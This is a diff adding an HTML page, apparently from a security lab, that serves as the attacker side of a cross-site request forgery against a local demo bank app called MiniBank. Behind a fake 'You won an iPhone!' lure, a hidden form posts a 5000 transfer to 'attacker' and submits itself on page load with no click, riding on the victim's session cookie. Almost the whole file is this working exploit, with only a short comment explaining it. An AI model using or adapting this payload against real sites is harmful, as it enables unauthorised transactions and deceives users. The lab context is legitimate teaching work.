@@ -1,0 +1,26 @@
+<!doctype html>
+<!--
+  ATTACKER PAGE (served from a different origin: http://localhost:8000)
+  CSRF exploit, POST variant: a hidden form that auto-submits to MiniBank.
+  The victim's browser attaches MiniBank's session cookie automatically.
+-->
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>You won a prize!</title>
+  <style>body{font-family:-apple-system,sans-serif;text-align:center;margin-top:80px}</style>
+</head>
+<body>
+  <h1>🎉 Congratulations! You won an iPhone!</h1>
+  <p>Processing your reward...</p>
+
+  <!-- ===== THE PAYLOAD ===== -->
+  <form id="csrf" action="http://localhost:5050/transfer" method="POST">
+    <input type="hidden" name="to" value="attacker">
+    <input type="hidden" name="amount" value="5000">
+  </form>
+  <script>
+    document.getElementById("csrf").submit();   // auto-submit, no click needed
+  </script>
+</body>
+</html>
